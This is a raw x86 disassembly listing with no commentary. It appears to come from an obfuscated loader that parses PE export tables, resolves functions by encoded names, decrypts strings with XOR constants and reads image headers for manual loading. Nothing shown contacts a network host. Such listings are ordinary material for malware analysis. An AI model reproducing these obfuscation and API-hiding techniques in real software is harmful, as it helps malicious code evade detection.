  414945:	cmp    BYTE PTR [edi+ebx*1],0x0
  414949:	je     0x414978
  41494b:	mov    ebx,DWORD PTR [ebp+0x8]
  41494e:	movzx  edi,dx
  414951:	movsx  di,BYTE PTR [edi+ebx*1]
  414956:	mov    ebx,0x3b4c
  41495b:	sub    di,bx
  41495e:	xor    di,ax
  414961:	cmp    cx,di
  414964:	je     0x414978
  414966:	push   0x7a
  414968:	pop    edi
  414969:	inc    DWORD PTR [ebp-0x4]
  41496c:	mov    cx,WORD PTR [ebp-0xc]
  414970:	cmp    WORD PTR [ebp-0x4],cx
  414974:	jb     0x414922
  414976:	jmp    0x41497e
  414978:	inc    DWORD PTR [ebp-0x8]
  41497b:	push   0x7d
  41497d:	pop    edi
  41497e:	mov    esi,DWORD PTR [ebp+0x8]
  414981:	movzx  ecx,dx
  414984:	cmp    BYTE PTR [ecx+esi*1],0x0
  414988:	je     0x41499d
  41498a:	inc    edx
  41498b:	cmp    edi,0x7a
  41498e:	jne    0x41490b
  414994:	xor    eax,eax
  414996:	pop    edi
  414997:	pop    esi
  414998:	pop    ebx
  414999:	leave  
  41499a:	ret    0x8
  41499d:	mov    ecx,DWORD PTR [ebp-0x8]
  4149a0:	add    ecx,0xffffc4b4
  4149a6:	xor    cx,ax
  4149a9:	xor    eax,eax
  4149ab:	cmp    cx,WORD PTR [ebp-0x10]
  4149af:	sete   al
  4149b2:	jmp    0x414996
  4149b4:	push   ebp
  4149b5:	mov    ebp,esp
  4149b7:	sub    esp,0x50
  4149ba:	push   edi
  4149bb:	mov    edi,eax
  4149bd:	mov    eax,DWORD PTR [edi+0x1a8]
  4149c3:	cmp    DWORD PTR [eax],0x0
  4149c6:	jne    0x4149cf
  4149c8:	xor    eax,eax
  4149ca:	jmp    0x414aff
  4149cf:	push   0x2c
  4149d1:	push   DWORD PTR [ebp+0x8]
  4149d4:	call   0x414779
  4149d9:	mov    edx,DWORD PTR [edi+0x1ac]
  4149df:	lea    eax,[edi+0x22]
  4149e2:	mov    DWORD PTR [ebp-0x4c],eax
  4149e5:	lea    eax,[edi+0x44]
  4149e8:	mov    DWORD PTR [ebp-0x48],eax
  4149eb:	lea    eax,[edi+0x66]
  4149ee:	mov    DWORD PTR [ebp-0x44],eax
  4149f1:	lea    eax,[edi+0x88]
  4149f7:	mov    DWORD PTR [ebp-0x40],eax
  4149fa:	lea    eax,[edi+0xaa]
  414a00:	mov    DWORD PTR [ebp-0x3c],eax
  414a03:	lea    eax,[edi+0xcc]
  414a09:	mov    DWORD PTR [ebp-0x38],eax
  414a0c:	lea    eax,[edi+0xee]
  414a12:	mov    DWORD PTR [ebp-0x34],eax
  414a15:	lea    eax,[edi+0x110]
  414a1b:	mov    DWORD PTR [ebp-0x30],eax
  414a1e:	lea    eax,[edi+0x132]
  414a24:	mov    DWORD PTR [ebp-0x2c],eax
  414a27:	lea    eax,[edi+0x154]
  414a2d:	push   edi
  414a2e:	mov    DWORD PTR [ebp-0x50],edi
  414a31:	mov    DWORD PTR [ebp-0x28],eax
  414a34:	call   0x414b33
  414a39:	push   eax
  414a3a:	mov    eax,DWORD PTR [edi+0x1a8]
  414a40:	push   DWORD PTR [eax]
  414a42:	call   0x4147d5
  414a47:	mov    DWORD PTR [ebp-0x10],eax
  414a4a:	test   eax,eax
  414a4c:	je     0x414aff
  414a52:	mov    ecx,DWORD PTR [eax+0x3c]
  414a55:	push   ebx
  414a56:	push   esi
  414a57:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  414a5b:	add    esi,eax
  414a5d:	mov    edi,DWORD PTR [esi+0x24]
  414a60:	mov    ecx,DWORD PTR [esi+0x1c]
  414a63:	mov    edx,DWORD PTR [esi+0x20]
  414a66:	mov    ebx,DWORD PTR [esi+0x18]
  414a69:	add    edi,eax
  414a6b:	mov    DWORD PTR [ebp-0x20],edi
  414a6e:	mov    edi,DWORD PTR [esi+0x14]
  414a71:	add    ecx,eax
  414a73:	add    edx,eax
  414a75:	mov    DWORD PTR [ebp-0xc],ecx
  414a78:	mov    DWORD PTR [ebp-0x1c],edx
  414a7b:	mov    DWORD PTR [ebp-0x8],edi
  414a7e:	cmp    edi,ebx
  414a80:	ja     0x414a85
  414a82:	mov    DWORD PTR [ebp-0x8],ebx
  414a85:	xor    ebx,ebx
  414a87:	mov    DWORD PTR [ebp-0x18],ebx
  414a8a:	cmp    DWORD PTR [ebp-0x8],ebx
  414a8d:	jbe    0x414afd
  414a8f:	jmp    0x414a94
  414a91:	mov    edx,DWORD PTR [ebp-0x1c]
  414a94:	mov    edi,DWORD PTR [ebp-0x20]
  414a97:	movzx  edi,WORD PTR [edi+ebx*2]
  414a9b:	cmp    ebx,DWORD PTR [esi+0x18]
  414a9e:	jae    0x414afd
  414aa0:	cmp    edi,DWORD PTR [esi+0x14]
  414aa3:	jae    0x414afd
  414aa5:	mov    ebx,DWORD PTR [edx+ebx*4]
  414aa8:	mov    edx,DWORD PTR [ebp+0x8]
  414aab:	mov    edi,DWORD PTR [ecx+edi*4]
  414aae:	mov    DWORD PTR [ebp-0x4],edx
  414ab1:	lea    edx,[ebp-0x50]
  414ab4:	add    ebx,eax
  414ab6:	add    edi,eax
  414ab8:	sub    edx,DWORD PTR [ebp+0x8]
  414abb:	mov    DWORD PTR [ebp-0x14],0xb
  414ac2:	mov    DWORD PTR [ebp-0x24],edx
  414ac5:	mov    edx,DWORD PTR [ebp-0x4]
  414ac8:	cmp    DWORD PTR [edx],0x0
  414acb:	jne    0x414ae8
  414acd:	mov    eax,DWORD PTR [ebp-0x24]
  414ad0:	push   DWORD PTR [eax+edx*1]
  414ad3:	push   ebx
  414ad4:	call   0x4148cf
  414ad9:	mov    ecx,DWORD PTR [ebp-0xc]
  414adc:	test   eax,eax
  414ade:	je     0x414ae5
  414ae0:	mov    eax,DWORD PTR [ebp-0x4]
  414ae3:	mov    DWORD PTR [eax],edi
  414ae5:	mov    eax,DWORD PTR [ebp-0x10]
  414ae8:	add    DWORD PTR [ebp-0x4],0x4
  414aec:	dec    DWORD PTR [ebp-0x14]
  414aef:	jne    0x414ac5
  414af1:	mov    ebx,DWORD PTR [ebp-0x18]
  414af4:	inc    ebx
  414af5:	mov    DWORD PTR [ebp-0x18],ebx
  414af8:	cmp    ebx,DWORD PTR [ebp-0x8]
  414afb:	jb     0x414a91
  414afd:	pop    esi
  414afe:	pop    ebx
  414aff:	pop    edi
  414b00:	leave  
  414b01:	ret    0x4
  414b04:	push   ebp
  414b05:	mov    ebp,esp
  414b07:	mov    eax,DWORD PTR [ebp+0x8]
  414b0a:	push   esi
  414b0b:	push   DWORD PTR [eax+0x1d8]
  414b11:	lea    esi,[eax+0x198]
  414b17:	mov    eax,DWORD PTR [ebp+0x8]
  414b1a:	call   0x4149b4
  414b1f:	mov    ecx,DWORD PTR [esi]
  414b21:	mov    DWORD PTR [ecx],eax
  414b23:	mov    eax,DWORD PTR [esi]
  414b25:	xor    ecx,ecx
  414b27:	cmp    DWORD PTR [eax],ecx
  414b29:	pop    esi
  414b2a:	setne  cl
  414b2d:	mov    eax,ecx
  414b2f:	pop    ebp
  414b30:	ret    0x4
  414b33:	mov    ecx,DWORD PTR [edi+0x188]
  414b39:	push   ebx
  414b3a:	jmp    0x414b4f
  414b3c:	xor    eax,0x8a89
  414b41:	add    eax,0x3b4c
  414b46:	mov    WORD PTR [ecx],ax
  414b49:	add    ecx,0x2
  414b4c:	add    edx,0x2
  414b4f:	movzx  eax,WORD PTR [edx]
  414b52:	mov    ebx,0x4e3d
  414b57:	cmp    ax,bx
  414b5a:	jne    0x414b3c
  414b5c:	xor    eax,eax
  414b5e:	mov    WORD PTR [ecx],ax
  414b61:	mov    eax,DWORD PTR [edi+0x188]
  414b67:	pop    ebx
  414b68:	ret    
  414b69:	push   edi
  414b6a:	mov    edi,eax
  414b6c:	mov    eax,DWORD PTR [esi+0x188]
  414b72:	shl    edi,0x6
  414b75:	add    eax,edi
  414b77:	jmp    0x414b83
  414b79:	xor    cl,0x71
  414b7c:	sub    cl,0xb
  414b7f:	mov    BYTE PTR [eax],cl
  414b81:	inc    eax
  414b82:	inc    edx
  414b83:	mov    cl,BYTE PTR [edx]
  414b85:	cmp    cl,0x7a
  414b88:	jne    0x414b79
  414b8a:	mov    BYTE PTR [eax],0x0
  414b8d:	mov    eax,DWORD PTR [esi+0x188]
  414b93:	add    eax,edi
  414b95:	pop    edi
  414b96:	ret    
  414b97:	push   ebp
  414b98:	mov    ebp,esp
  414b9a:	sub    esp,0x38
  414b9d:	push   ebx
  414b9e:	mov    ebx,0xf89c85b5
  414ba3:	mov    DWORD PTR [ebp-0x4],ebx
  414ba6:	lea    eax,[ebx-0x3]
  414ba9:	push   esi
  414baa:	mov    DWORD PTR [ebp-0x24],eax
  414bad:	mov    ecx,DWORD PTR [ebp-0x4]
  414bb0:	mov    edx,DWORD PTR [ebp+0x8]
  414bb3:	mov    esi,0x7510896
  414bb8:	push   edi
  414bb9:	xor    ecx,esi
  414bbb:	mov    edi,0x3272dd
  414bc0:	add    ecx,edi
  414bc2:	cmp    edx,ecx
  414bc4:	je     0x414d32
  414bca:	mov    ecx,DWORD PTR [ebp-0x4]
  414bcd:	mov    edx,DWORD PTR [ebp+0xc]
  414bd0:	xor    ecx,esi
  414bd2:	add    ecx,edi
  414bd4:	cmp    edx,ecx
  414bd6:	je     0x414d32
  414bdc:	mov    ecx,DWORD PTR [ebp+0x10]
  414bdf:	mov    DWORD PTR [ebp-0x18],ecx
  414be2:	mov    ecx,DWORD PTR [ebp+0xc]
  414be5:	mov    DWORD PTR [ebp-0x14],ecx
  414be8:	mov    ecx,DWORD PTR [ebp+0x8]
  414beb:	mov    DWORD PTR [ebp-0x1c],0xf89c8508
  414bf2:	mov    DWORD PTR [ebp-0x20],eax
  414bf5:	mov    DWORD PTR [ebp-0x10],ebx
  414bf8:	mov    DWORD PTR [ebp+0xc],eax
  414bfb:	mov    DWORD PTR [ebp+0x10],0xf89c85b3
  414c02:	mov    eax,DWORD PTR [ebp+0xc]
  414c05:	mov    DWORD PTR [ebp-0xc],ecx
  414c08:	xor    eax,esi
  414c0a:	mov    ecx,0xffcd8d23
  414c0f:	sub    ecx,eax
  414c11:	add    ecx,DWORD PTR [ebp-0x14]
  414c14:	mov    DWORD PTR [ebp+0x8],ecx
  414c17:	mov    DWORD PTR [ebp-0x8],0xf89c85be
  414c1e:	jmp    0x414d22
  414c23:	mov    eax,DWORD PTR [ebp+0xc]
  414c26:	mov    ecx,DWORD PTR [ebp+0xc]
  414c29:	xor    eax,esi
  414c2b:	xor    ecx,esi
  414c2d:	lea    ecx,[eax+ecx*1+0x64e5ba]
  414c34:	mov    eax,DWORD PTR [ebp+0x8]
  414c37:	xor    edx,edx
  414c39:	div    ecx
  414c3b:	mov    eax,DWORD PTR [ebp+0x10]
  414c3e:	mov    ecx,DWORD PTR [ebp+0xc]
  414c41:	xor    eax,esi
  414c43:	xor    ecx,esi
  414c45:	sub    eax,ecx
  414c47:	cmp    edx,eax
  414c49:	jne    0x414cde
  414c4f:	mov    eax,DWORD PTR [ebp+0x8]
  414c52:	add    eax,DWORD PTR [ebp-0xc]
  414c55:	mov    dl,BYTE PTR [eax]
  414c57:	mov    eax,DWORD PTR [ebp-0x10]
  414c5a:	mov    ecx,DWORD PTR [ebp-0x8]
  414c5d:	xor    eax,esi
  414c5f:	xor    ecx,esi
  414c61:	add    eax,edi
  414c63:	add    ecx,edi
  414c65:	cmp    eax,ecx
  414c67:	jae    0x414caf
  414c69:	lea    ecx,[eax-0x3272dd]
  414c6f:	mov    DWORD PTR [ebp-0x4],ecx
  414c72:	mov    ebx,DWORD PTR [ebp-0x4]
  414c75:	xor    ebx,esi
  414c77:	add    ebx,0x7f55d8f3
  414c7d:	lea    ecx,[ebp+eax*4-0x38]
  414c81:	mov    DWORD PTR [ecx],ebx
  414c83:	mov    ebx,DWORD PTR [ecx]
  414c85:	cmp    ebx,0x244ecbd0
  414c8b:	jbe    0x414c95
  414c8d:	add    DWORD PTR [ecx],0x405fc11
  414c93:	jmp    0x414c9b
  414c95:	add    DWORD PTR [ecx],0xfdaf43ef
  414c9b:	mov    ecx,DWORD PTR [ebp-0x8]
  414c9e:	xor    ecx,esi
  414ca0:	inc    eax
  414ca1:	inc    DWORD PTR [ebp-0x4]
  414ca4:	add    ecx,edi
  414ca6:	cmp    eax,ecx
  414ca8:	jb     0x414c72
  414caa:	mov    ebx,0xf89c85b5
  414caf:	mov    eax,DWORD PTR [ebp-0x18]
  414cb2:	test   eax,eax
  414cb4:	jne    0x414cbe
  414cb6:	xor    dl,0x71
  414cb9:	sub    dl,0xb
  414cbc:	jmp    0x414cd4
  414cbe:	mov    eax,DWORD PTR [ebp-0x1c]
  414cc1:	xor    al,0x96
  414cc3:	mov    cl,0x23
  414cc5:	sub    cl,al
  414cc7:	add    dl,cl
  414cc9:	mov    ecx,DWORD PTR [ebp-0x20]
  414ccc:	xor    cl,0x96
  414ccf:	sub    cl,0x23
  414cd2:	ror    dl,cl
  414cd4:	xor    eax,eax
  414cd6:	mov    eax,DWORD PTR [ebp+0x8]
  414cd9:	add    eax,DWORD PTR [ebp-0xc]
  414cdc:	mov    BYTE PTR [eax],dl
  414cde:	mov    eax,DWORD PTR [ebp+0x8]
  414ce1:	mov    ecx,DWORD PTR [ebp-0x10]
  414ce4:	sub    eax,edi
  414ce6:	xor    eax,esi
  414ce8:	cmp    eax,ecx
  414cea:	jne    0x414d10
  414cec:	mov    eax,DWORD PTR [ebp+0x10]
  414cef:	mov    ecx,DWORD PTR [ebp+0xc]
  414cf2:	xor    eax,esi
  414cf4:	xor    ecx,esi
  414cf6:	sub    eax,ecx
  414cf8:	sub    eax,edi
  414cfa:	xor    eax,esi
  414cfc:	mov    DWORD PTR [ebp+0x10],eax
  414cff:	mov    eax,DWORD PTR [ebp+0xc]
  414d02:	xor    eax,esi
  414d04:	mov    ecx,0xffcd8d23
  414d09:	sub    ecx,eax
  414d0b:	add    ecx,DWORD PTR [ebp-0x14]
  414d0e:	jmp    0x414d1f
  414d10:	mov    eax,DWORD PTR [ebp+0xc]
  414d13:	xor    eax,esi
  414d15:	mov    ecx,0xffcd8d23
  414d1a:	sub    ecx,eax
  414d1c:	add    ecx,DWORD PTR [ebp+0x8]
  414d1f:	mov    DWORD PTR [ebp+0x8],ecx
  414d22:	mov    eax,DWORD PTR [ebp+0x10]
  414d25:	cmp    eax,ebx
  414d27:	jne    0x414c23
  414d2d:	mov    eax,DWORD PTR [ebp-0x24]
  414d30:	jmp    0x414d35
  414d32:	mov    eax,DWORD PTR [ebp-0x4]
  414d35:	xor    eax,esi
  414d37:	add    eax,edi
  414d39:	pop    edi
  414d3a:	pop    esi
  414d3b:	pop    ebx
  414d3c:	leave  
  414d3d:	ret    0xc
  414d40:	push   ebp
  414d41:	mov    ebp,esp
  414d43:	sub    esp,0x14
  414d46:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  414d4d:	mov    DWORD PTR [ebp-0x4],0xf89c85b2
  414d54:	mov    eax,DWORD PTR [ebx]
  414d56:	mov    DWORD PTR [ebp-0x8],eax
  414d59:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  414d60:	push   esi
  414d61:	push   edi
  414d62:	mov    DWORD PTR [ebp-0x14],0xead718d5
  414d69:	mov    edi,DWORD PTR [ebp-0x4]
  414d6c:	mov    ecx,DWORD PTR [ebp-0x10]
  414d6f:	mov    eax,0x7510896
  414d74:	xor    edi,eax
  414d76:	mov    edx,0x3272dd
  414d7b:	xor    ecx,eax
  414d7d:	add    edi,edx
  414d7f:	add    ecx,edx
  414d81:	imul   edi,ecx
  414d84:	jmp    0x414dcc
  414d86:	mov    ecx,DWORD PTR [ebp-0x8]
  414d89:	mov    esi,DWORD PTR [ebp-0x4]
  414d8c:	xor    ecx,eax
  414d8e:	xor    esi,eax
  414d90:	add    ecx,edx
  414d92:	add    esi,edx
  414d94:	test   esi,ecx
  414d96:	mov    esi,DWORD PTR [ebp-0x8]
  414d99:	mov    ecx,DWORD PTR [ebp-0x4]
  414d9c:	je     0x414db3
  414d9e:	xor    ecx,eax
  414da0:	xor    esi,eax
  414da2:	add    ecx,edx
  414da4:	add    esi,edx
  414da6:	shr    esi,cl
  414da8:	mov    ecx,DWORD PTR [ebp-0x14]
  414dab:	xor    ecx,eax
  414dad:	add    ecx,edx
  414daf:	xor    esi,ecx
  414db1:	jmp    0x414dbd
  414db3:	xor    esi,eax
  414db5:	xor    ecx,eax
  414db7:	add    esi,edx
  414db9:	add    ecx,edx
  414dbb:	shr    esi,cl
  414dbd:	mov    DWORD PTR [ebp-0x8],esi
  414dc0:	mov    ecx,DWORD PTR [ebp-0x4]
  414dc3:	xor    ecx,eax
  414dc5:	lea    edi,[edi+ecx*1+0x3272dd]
  414dcc:	mov    ecx,DWORD PTR [ebp-0xc]
  414dcf:	mov    esi,DWORD PTR [ebp-0x4]
  414dd2:	xor    esi,eax
  414dd4:	xor    ecx,eax
  414dd6:	sub    ecx,esi
  414dd8:	cmp    edi,ecx
  414dda:	jbe    0x414d86
  414ddc:	mov    eax,DWORD PTR [ebp-0x8]
  414ddf:	pop    edi
  414de0:	mov    DWORD PTR [ebx],eax
  414de2:	mov    eax,DWORD PTR [ebp-0x8]
  414de5:	pop    esi
  414de6:	leave  
  414de7:	ret    
  414de8:	push   ebp
  414de9:	mov    ebp,esp
  414deb:	sub    esp,0x420
  414df1:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  414df8:	mov    DWORD PTR [ebp-0xc],0xf89c85b2
  414dff:	mov    DWORD PTR [ebp-0x18],0xf89c86b5
  414e06:	push   ebx
  414e07:	mov    DWORD PTR [ebp-0x1c],0xf89c85b4
  414e0e:	mov    eax,DWORD PTR [ebp-0x14]
  414e11:	push   esi
  414e12:	mov    esi,0x7510896
  414e17:	push   edi
  414e18:	xor    eax,esi
  414e1a:	mov    edi,0x3272dd
  414e1f:	add    eax,edi
  414e21:	mov    DWORD PTR [ebp-0x8],eax
  414e24:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  414e2b:	mov    DWORD PTR [ebp-0x4],0xead718d5
  414e32:	mov    DWORD PTR [ebp-0x10],0x8
  414e39:	mov    ecx,ecx
  414e3b:	mov    eax,DWORD PTR [ebp-0xc]
  414e3e:	mov    ecx,DWORD PTR [ebp-0x14]
  414e41:	xor    eax,esi
  414e43:	xor    ecx,esi
  414e45:	add    eax,edi
  414e47:	add    ecx,edi
  414e49:	imul   eax,ecx
  414e4c:	jmp    0x414e7f
  414e4e:	mov    eax,DWORD PTR [ebp-0x4]
  414e51:	sub    eax,edi
  414e53:	xor    eax,esi
  414e55:	mov    DWORD PTR [ebp-0x8],eax
  414e58:	lea    ebx,[ebp-0x8]
  414e5b:	call   0x414d40
  414e60:	mov    DWORD PTR [ebp-0x8],eax
  414e63:	mov    eax,DWORD PTR [ebp-0x8]
  414e66:	mov    ecx,DWORD PTR [ebp-0x4]
  414e69:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  414e70:	mov    eax,DWORD PTR [ebp-0xc]
  414e73:	mov    ecx,DWORD PTR [ebp-0x4]
  414e76:	xor    eax,esi
  414e78:	lea    eax,[eax+ecx*1+0x3272dd]
  414e7f:	mov    DWORD PTR [ebp-0x4],eax
  414e82:	mov    eax,DWORD PTR [ebp-0x18]
  414e85:	mov    ecx,DWORD PTR [ebp-0xc]
  414e88:	xor    ecx,esi
  414e8a:	xor    eax,esi
  414e8c:	sub    eax,ecx
  414e8e:	mov    ecx,DWORD PTR [ebp-0x4]
  414e91:	cmp    ecx,eax
  414e93:	jbe    0x414e4e
  414e95:	mov    eax,DWORD PTR [ebp-0x1c]
  414e98:	xor    eax,esi
  414e9a:	add    eax,edi
  414e9c:	mov    DWORD PTR [ebp-0x8],eax
  414e9f:	mov    DWORD PTR [ebp-0x18],0xf89c86b4
  414ea6:	mov    ebx,ebx
  414ea8:	jmp    0x414f0b
  414eaa:	mov    ecx,DWORD PTR [ebp-0x20]
  414ead:	mov    eax,DWORD PTR [ebp-0x8]
  414eb0:	xor    ecx,esi
  414eb2:	add    ecx,edi
  414eb4:	shr    eax,cl
  414eb6:	mov    DWORD PTR [ebp-0x4],eax
  414eb9:	mov    eax,DWORD PTR [ebp+0x8]
  414ebc:	mov    cl,BYTE PTR [eax]
  414ebe:	mov    BYTE PTR [ebp+0xb],cl
  414ec1:	mov    cl,BYTE PTR [ebp+0xb]
  414ec4:	mov    edx,DWORD PTR [ebp-0x8]
  414ec7:	movzx  ecx,cl
  414eca:	xor    ecx,edx
  414ecc:	mov    DWORD PTR [ebp+0x8],ecx
  414ecf:	mov    ecx,DWORD PTR [ebp-0x18]
  414ed2:	mov    edx,DWORD PTR [ebp+0x8]
  414ed5:	xor    ecx,esi
  414ed7:	add    ecx,edi
  414ed9:	and    ecx,edx
  414edb:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  414ee2:	mov    edx,DWORD PTR [ebp-0x4]
  414ee5:	xor    ecx,edx
  414ee7:	mov    DWORD PTR [ebp-0x8],ecx
  414eea:	mov    ecx,DWORD PTR [ebp-0xc]
  414eed:	xor    ecx,esi
  414eef:	lea    eax,[eax+ecx*1+0x3272dd]
  414ef6:	mov    DWORD PTR [ebp+0x8],eax
  414ef9:	mov    eax,DWORD PTR [ebp-0xc]
  414efc:	xor    eax,esi
  414efe:	mov    ecx,0xffcd8d23
  414f03:	sub    ecx,eax
  414f05:	add    ecx,DWORD PTR [ebp-0x10]
  414f08:	mov    DWORD PTR [ebp-0x10],ecx
  414f0b:	mov    eax,DWORD PTR [ebp-0x14]
  414f0e:	mov    ecx,DWORD PTR [ebp-0x10]
  414f11:	xor    eax,esi
  414f13:	add    eax,edi
  414f15:	cmp    ecx,eax
  414f17:	jne    0x414eaa
  414f19:	mov    eax,DWORD PTR [ebp-0x1c]
  414f1c:	mov    ecx,DWORD PTR [ebp-0x8]
  414f1f:	xor    eax,esi
  414f21:	add    eax,edi
  414f23:	pop    edi
  414f24:	pop    esi
  414f25:	xor    eax,ecx
  414f27:	pop    ebx
  414f28:	leave  
  414f29:	ret    0x4
  414f2c:	push   ebp
  414f2d:	mov    ebp,esp
  414f2f:	mov    eax,DWORD PTR [ebp+0x1c]
  414f32:	mov    ecx,DWORD PTR [ebp+0x8]
  414f35:	mov    edx,DWORD PTR [ebp+0x10]
  414f38:	mov    eax,DWORD PTR [eax+0x190]
  414f3e:	mov    eax,DWORD PTR [eax]
  414f40:	sub    esp,0x64
  414f43:	push   ebx
  414f44:	push   esi
  414f45:	push   edi
  414f46:	mov    edi,0x7510896
  414f4b:	xor    ecx,edi
  414f4d:	mov    ebx,0x3272dd
  414f52:	add    ecx,ebx
  414f54:	cmp    ecx,edx
  414f56:	jne    0x414f67
  414f58:	or     DWORD PTR ds:0x3750c3f,0x4263eb0c
  414f62:	jmp    0x415464
  414f67:	mov    ecx,DWORD PTR [ebp+0x8]
  414f6a:	mov    esi,DWORD PTR [ebp+0x14]
  414f6d:	mov    edx,DWORD PTR [esi]
  414f6f:	xor    ecx,edi
  414f71:	add    ecx,ebx
  414f73:	cmp    edx,ecx
  414f75:	je     0x41541f
  414f7b:	mov    ecx,DWORD PTR [ebp+0x1c]
  414f7e:	mov    DWORD PTR [ebp-0x1c],eax
  414f81:	mov    DWORD PTR [ebp+0x1c],ecx
  414f84:	mov    ecx,DWORD PTR [ebp+0x18]
  414f87:	mov    eax,DWORD PTR [esi]
  414f89:	mov    DWORD PTR [ebp-0x20],eax
  414f8c:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  414f93:	mov    edx,0xf89c85b2
  414f98:	mov    DWORD PTR [ebp-0x8],edx
  414f9b:	mov    eax,DWORD PTR [ebp+0x1c]
  414f9e:	mov    DWORD PTR [ebp+0x1c],eax
  414fa1:	mov    eax,DWORD PTR [ebp+0x1c]
  414fa4:	mov    eax,DWORD PTR [eax+0x190]
  414faa:	mov    eax,DWORD PTR [eax]
  414fac:	mov    DWORD PTR [ebp-0x24],ecx
  414faf:	mov    ecx,DWORD PTR [ebp+0x1c]
  414fb2:	mov    ecx,DWORD PTR [ecx+0x190]
  414fb8:	mov    ecx,DWORD PTR [ecx]
  414fba:	add    ecx,DWORD PTR [eax+0x3c]
  414fbd:	mov    DWORD PTR [ebp+0x10],ecx
  414fc0:	mov    eax,DWORD PTR [ebp+0x8]
  414fc3:	xor    eax,edi
  414fc5:	add    eax,ebx
  414fc7:	mov    DWORD PTR [ebp-0x4],eax
  414fca:	mov    eax,DWORD PTR [ebp+0x8]
  414fcd:	xor    eax,edi
  414fcf:	add    eax,ebx
  414fd1:	mov    DWORD PTR [ebp+0x18],eax
  414fd4:	mov    eax,DWORD PTR [ebp+0x10]
  414fd7:	mov    eax,DWORD PTR [eax+0x50]
  414fda:	sub    eax,0xc
  414fdd:	mov    DWORD PTR [ebp-0x28],eax
  414fe0:	mov    eax,DWORD PTR [ebp+0x10]
  414fe3:	mov    eax,DWORD PTR [eax+0x38]
  414fe6:	mov    ecx,DWORD PTR [ebp+0x10]
  414fe9:	dec    eax
  414fea:	test   DWORD PTR [ecx+0x54],eax
  414fed:	mov    eax,DWORD PTR [ebp+0x10]
  414ff0:	je     0x41500a
  414ff2:	mov    eax,DWORD PTR [eax+0x38]
  414ff5:	mov    ecx,DWORD PTR [ebp+0x10]
  414ff8:	mov    ecx,DWORD PTR [ecx+0x54]
  414ffb:	dec    eax
  414ffc:	not    eax
  414ffe:	and    ecx,eax
  415000:	mov    eax,DWORD PTR [ebp+0x10]
  415003:	mov    eax,DWORD PTR [eax+0x38]
  415006:	add    eax,ecx
  415008:	jmp    0x41500d
  41500a:	mov    eax,DWORD PTR [eax+0x54]
  41500d:	mov    DWORD PTR [ebp+0x1c],eax
  415010:	mov    eax,DWORD PTR [ebp+0x8]
  415013:	xor    eax,edi
  415015:	add    eax,ebx
  415017:	mov    DWORD PTR [ebp+0x18],eax
  41501a:	mov    eax,DWORD PTR [ebp+0x8]
  41501d:	xor    eax,edi
  41501f:	add    eax,ebx
  415021:	mov    DWORD PTR [ebp+0x18],eax
  415024:	mov    eax,DWORD PTR [ebp+0x8]
  415027:	mov    ecx,DWORD PTR [ebp-0x24]
  41502a:	xor    eax,edi
  41502c:	add    eax,ebx
  41502e:	mov    DWORD PTR [ecx],eax
  415030:	mov    DWORD PTR [ebp+0x18],edx
  415033:	mov    DWORD PTR [ebp+0x18],0xf89c85b3
  41503a:	mov    DWORD PTR [ebp+0x18],0xf89c85b0
  415041:	mov    DWORD PTR [ebp+0x18],0xf89c85b1
  415048:	mov    eax,DWORD PTR [ebp-0x8]
  41504b:	mov    ecx,DWORD PTR [ebp+0x1c]
  41504e:	xor    eax,edi
  415050:	add    eax,ebx
  415052:	imul   eax,ecx
  415055:	mov    ecx,DWORD PTR [ebp+0x8]
  415058:	mov    edx,DWORD PTR [ebp-0x28]
  41505b:	xor    ecx,edi
  41505d:	lea    ecx,[ecx+edx*1+0x3272dd]
  415064:	cmp    eax,ecx
  415066:	jae    0x415418
  41506c:	mov    eax,DWORD PTR [ebp+0x8]
  41506f:	xor    eax,edi
  415071:	add    eax,ebx
  415073:	mov    DWORD PTR [ebp+0x18],eax
  415076:	mov    eax,DWORD PTR [ebp+0x1c]
  415079:	add    eax,DWORD PTR [ebp-0x1c]
  41507c:	mov    DWORD PTR [ebp-0x4],eax
  41507f:	push   DWORD PTR [ebp-0x4]
  415082:	mov    esi,DWORD PTR [ebp-0x1c]
  415085:	mov    ecx,DWORD PTR [ebp+0x10]
  415088:	call   0x41416e
  41508d:	mov    DWORD PTR [ebp+0xc],eax
  415090:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  415097:	mov    eax,DWORD PTR [ebp-0x18]
  41509a:	xor    eax,edi
  41509c:	add    eax,ebx
  41509e:	push   eax
  41509f:	lea    eax,[ebp-0x40]
  4150a2:	push   eax
  4150a3:	call   0x414779
  4150a8:	mov    eax,DWORD PTR [ebp+0xc]
  4150ab:	test   eax,eax
  4150ad:	je     0x4150fd
  4150af:	mov    eax,DWORD PTR [ebp-0x18]
  4150b2:	xor    eax,edi
  4150b4:	add    eax,ebx
  4150b6:	push   eax
  4150b7:	push   DWORD PTR [ebp+0xc]
  4150ba:	lea    eax,[ebp-0x40]
  4150bd:	push   eax
  4150be:	call   0x414620
  4150c3:	mov    eax,DWORD PTR [ebp-0x4]
  4150c6:	mov    DWORD PTR [ebp-0x18],eax
  4150c9:	mov    eax,DWORD PTR [ebp-0x18]
  4150cc:	mov    ecx,DWORD PTR [ebp-0x1c]
  4150cf:	sub    eax,ecx
  4150d1:	mov    DWORD PTR [ebp-0x18],eax
  4150d4:	mov    eax,DWORD PTR [ebp+0xc]
  4150d7:	mov    ecx,DWORD PTR [ebp+0xc]
  4150da:	mov    eax,DWORD PTR [eax+0x10]
  4150dd:	add    eax,DWORD PTR [ecx+0xc]
  4150e0:	mov    ecx,DWORD PTR [ebp-0x18]
  4150e3:	cmp    ecx,eax
  4150e5:	jb     0x4150fd
  4150e7:	mov    eax,DWORD PTR [ebp+0xc]
  4150ea:	mov    eax,DWORD PTR [eax+0xc]
  4150ed:	mov    ecx,DWORD PTR [ebp+0xc]
  4150f0:	add    eax,DWORD PTR [ecx+0x8]
  4150f3:	mov    ecx,DWORD PTR [ebp-0x18]
  4150f6:	sub    eax,ecx
  4150f8:	jmp    0x4153eb
  4150fd:	push   0xc
  4150ff:	push   DWORD PTR [ebp-0x4]
  415102:	lea    eax,[ebp-0x4c]
  415105:	push   eax
  415106:	call   0x414620
  41510b:	mov    eax,0xf89c85b5
  415110:	mov    DWORD PTR [ebp-0x2c],eax
